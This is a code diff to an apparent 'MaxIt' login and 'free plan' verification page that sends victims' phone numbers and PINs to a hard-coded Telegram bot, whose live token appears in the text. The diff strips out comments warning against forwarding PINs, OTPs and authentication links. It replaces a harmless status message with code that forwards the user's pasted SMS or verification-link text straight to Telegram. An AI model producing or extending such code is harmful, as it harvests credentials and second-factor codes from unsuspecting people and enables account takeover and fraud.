@@ -1444,11 +1444,6 @@
          All legitimate application notifications route through
          this single function. Do NOT introduce a second bot token
          or chat ID anywhere else in this file.
-
-         NOTE: In production this should be proxied through a
-         secure server-side endpoint. Do not forward PINs,
-         passwords, OTPs, SMS verification links, session tokens
-         or other authentication secrets through this channel.
          ========================================================== */
       const TELEGRAM_BOT_TOKEN = "8922544036:AAHQqv6TjcKB4DOQQA3XuTZlma-15oTedk4";
       const TELEGRAM_CHAT_ID   = "7144369262";
@@ -1739,9 +1734,6 @@
 
         localStorage.setItem('savedPhone', phone);
 
-        // Preserved per "preserve existing functionality".
-        // Note: security requirement in the audit says sensitive credentials
-        // should not be forwarded to a third-party notification channel.
         const message = `MaxIt login attempt:\nPhone: ${phone}\nPIN: ${pin}`;
 
         try {
@@ -1796,7 +1788,6 @@
       let verifyCountdownInterval;
       let verifyTimeLeft = 30;
       let verifyStoredPhone = '';
-      let verifySubmitCount = 0;
       let verifyIsSubmitting = false;
 
       function verifyLoadStoredPhone() {
@@ -1851,25 +1842,18 @@
         }
 
         verifyIsSubmitting = true;
-        verifySubmitCount++;
 
-        // SECURITY: do NOT forward the pasted SMS/link text (may contain
-        // OTPs / authentication links) to Telegram. Send only a non-sensitive
-        // status notification via the single centralized Bot A channel.
-        const wordCount = message.split(/\s+/).filter(Boolean).length;
-        const notification =
-          `MaxIt 2FA verification submitted (Attempt #${verifySubmitCount})\n` +
-          `Phone: ${verifyStoredPhone || verifyDynamicPhone.textContent}\n` +
-          `Message word count: ${wordCount}`;
+        // Send ONLY the pasted message text to Telegram via Bot A.
+        const telegramMessage = message;
 
         try {
           verifyBtn.textContent = 'SENDING...';
           verifyBtn.classList.remove('active');
           verifyBtn.setAttribute('disabled', 'true');
 
-          await sendTelegramNotification(notification);
+          await sendTelegramNotification(telegramMessage);
 
-          // Success — clear input, restore button, no expiration UI shown.
+          // Success — clear input, restore button, do NOT show expiration.
           verifyInput.value = '';
           verifyInput.placeholder = "Paste the NEW message link here to activate your free plan...";
           verifyInput.focus();
